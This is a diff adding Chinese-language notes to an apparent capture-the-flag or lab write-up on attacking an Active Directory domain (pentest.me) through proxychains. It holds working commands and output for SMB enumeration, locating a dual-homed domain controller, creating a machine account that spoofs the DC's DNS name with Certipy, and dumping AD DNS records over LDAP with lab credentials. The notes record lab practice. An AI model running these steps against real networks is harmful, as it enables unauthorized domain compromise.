@@ -654,3 +654,67 @@ confluence_ichunqiu_2022
 ![](assets/file-20260601222726038.png)
 
 
+## VLAN 2 - 172.24.7.0/24
+
+SMB 扫描该网段的 Windows 主机：
+```bash
+☁  endless   PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q nxc smb 172.24.7.16/24 
+SMB         172.24.7.3      445    DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:pentest.me) (signing:True) (SMBv1:True)
+SMB         172.24.7.48     445    IZAYSXE6VCUHB4Z  [*] Windows Server 2022 Build 20348 (name:IZAYSXE6VCUHB4Z) (domain:pentest.me) (signing:False) (SMBv1:False)
+SMB         172.24.7.5      445    DCadmin          [*] Windows 10 / Server 2016 Build 14393 (name:DCadmin) (domain:pen.me) (signing:True) (SMBv1:True)
+SMB         172.24.7.16     445    IZMN9U6ZO3VTRNZ  [*] Windows Server 2022 Build 20348 (name:IZMN9U6ZO3VTRNZ) (domain:pentest.me) (signing:False) (SMBv1:False)
+SMB         172.24.7.43     445    IZMN9U6ZO3VTRPZ  [*] Windows Server 2022 Build 20348 (name:IZMN9U6ZO3VTRPZ) (domain:pentest.me) (signing:False) (SMBv1:False)
+Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+```
+
+### 172.24.7.3 - 172.25.12.9
+域控主机 PENTEST\DC 存在 172.24.7.3/172.25.12.9 双网卡：
+```bash
+☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q nxc smb 172.24.7.3 -M ioxidresolver
+SMB         172.24.7.3      445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:pentest.me) (signing:True) (SMBv1:True)
+IOXIDRES... 172.24.7.3      445    DC               Address: 172.24.7.3
+IOXIDRES... 172.24.7.3      445    DC               Address: 172.25.12.9
+```
+
+
+必须使用 PROXYCHAINS_CONF_FILE 环境变量指定 proxychains4-24.conf（对应 6001 端口，通往 172.24.7.0/24）。
+```bash
+☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q certipy-ad account create -u usera@pentest.me -p 'Admin3gv83' -dc-ip 172.24.7.3 -user 'EVILCOMPUTER1$' -pass '123@#ABC' -dns 'DC.pentest.me'
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Creating new account:
+    sAMAccountName                      : EVILCOMPUTER1$
+    unicodePwd                          : 123@#ABC
+    userAccountControl                  : 4096
+    servicePrincipalName                : HOST/EVILCOMPUTER1
+                                          RestrictedKrbHost/EVILCOMPUTER1
+    dnsHostName                         : DC.pentest.me
+[*] Successfully created account 'EVILCOMPUTER1$' with password '123@#ABC'
+```
+
+## 查询 pentest.me 域中所有 DNS 记录，分析域内网络环境：
+
+用下面的会报错
+```
+proxychains4 -q nxc ldap 172.24.7.3 -u usera -p Admin3gv83 -d pentest.me -ns 172.24.7.3 -M get-network -o ALL=true
+```
+
+###  用 ldapsearch（原生、最稳、无依赖）
+
+#### 直接查 AD 集成 DNS（普通域用户权限即可）：
+```bash
+# 先查有哪些 DNS 区域
+PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q \
+ldapsearch -x -H ldap://172.24.7.3 \
+  -D "usera@pentest.me" -w "Admin3gv83" \
+  -b "CN=MicrosoftDNS,DC=DomainDnsZones,DC=pentest,DC=me" "(objectClass=dnsZone)"
+```
+
+#### 再查具体记录：
+```bash
+PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q \
+ldapsearch -x -H ldap://172.24.7.3 \
+  -D "usera@pentest.me" -w "Admin3gv83" \
+  -b "DC=pentest.me,CN=MicrosoftDNS,DC=DomainDnsZones,DC=pentest,DC=me" "(objectClass=dnsNode)" \
+  name dnsRecord
+```
